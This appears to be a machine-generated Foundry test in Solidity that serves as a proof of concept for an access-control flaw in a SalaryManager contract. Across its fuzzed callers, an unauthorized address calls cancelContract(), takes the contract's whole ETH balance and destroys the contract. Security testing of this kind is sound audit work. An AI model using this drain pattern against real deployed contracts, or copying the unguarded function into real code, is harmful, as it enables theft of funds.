// Generation Time: 14,54s
// Input Tokens: 2650
// Output Tokens: 567
// Reasoning Tokens: 427


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager private _salaryManager;
    address private _owner;

    function setUp() public {
        _owner = address(this);
        _salaryManager = new SalaryManager();
        
        // Send some ETH to the contract to satisfy the precondition
        // _totalAllocated starts at 0, so we need address(this).balance > 0
        vm.deal(address(_salaryManager), 1 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // Exclude the test contract (which is the owner)
        vm.assume(caller != address(this));
        
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the contract itself
        vm.assume(caller != address(_salaryManager));

        // Record the caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalance = address(_salaryManager).balance;

        // Simulate the unauthorized caller invoking the critical function
        vm.prank(caller);
        _salaryManager.cancelContract();

        // Assert that the unauthorized caller received the contract's funds
        // This proves the access control is flawed
        assertEq(caller.balance, callerBalanceBefore + contractBalance);
        
        // Assert that the contract was destroyed (code size is 0)
        uint256 codeSize;
        address target = address(_salaryManager);
        assembly {
            codeSize := extcodesize(target)
        }
        assertEq(codeSize, 0);
    }
}
